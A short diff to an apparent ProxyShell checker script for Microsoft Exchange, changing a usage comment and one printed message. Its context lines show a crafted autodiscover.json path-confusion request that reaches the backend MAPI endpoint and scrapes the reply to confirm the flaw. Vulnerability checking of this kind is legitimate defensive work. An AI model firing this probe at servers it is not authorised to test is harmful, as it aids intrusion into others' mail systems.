@@ -2,7 +2,7 @@ import requests
 import argparse
 from bs4 import BeautifulSoup
 ###Usage:
-### python3 check-proxyshell.py mail.localhost.local
+### python3 check-proxyshell.py --url mail.localhost.local
 
 s = requests.session()
 parser = argparse.ArgumentParser()
@@ -15,7 +15,7 @@ def check(target):
   
     if r.status_code==302 or r.status_code==500:
         print("\nTarget seems vulnerable for Remote code execution!\n")
-        print("Trying to get some more info for confirmation\n--------------------------\n")
+        print("Let's see if we can get more info \n--------------------------------------\n")
         rr = s.get("https://" + target + "/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com")
         soup = BeautifulSoup(rr.text, 'html.parser')
         for y in soup.find_all('p'):
